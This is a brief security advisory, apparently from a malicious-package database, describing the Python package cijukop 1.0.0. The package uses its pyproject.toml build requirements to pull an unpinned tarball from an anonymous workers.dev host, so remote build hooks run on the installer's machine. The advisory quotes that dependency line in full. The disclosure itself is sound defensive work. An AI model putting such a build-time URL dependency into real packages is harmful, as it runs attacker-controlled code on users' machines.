summary: pyproject build-system fetches unpinned tarball from attacker-controlled workers.dev host
details: cijukop 1.0.0 ships a nearly empty module (cijukop.py is a stub) and declares its payload through pyproject.toml's [build-system].requires, which references `header-buffer-binary-shard @ https://package-registry-receiver-stg.depx-research-bf0.workers.dev/pypi/header_buffer_binary_shard-1.0.0.tar.gz`. PEP 517 build frontends resolve and install this URL dependency into the isolated build environment before the sdist is built, executing the fetched tarball's setup/build hooks on the installer's machine. The source is an anonymous Cloudflare workers.dev endpoint rather than a package index or publisher domain, there is no version pin and no hash/integrity check, and whoever controls the URL can change the delivered bytes at any time. Because the shipped module is inert, this off-registry build-time dependency is the package's only functional effect on install.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
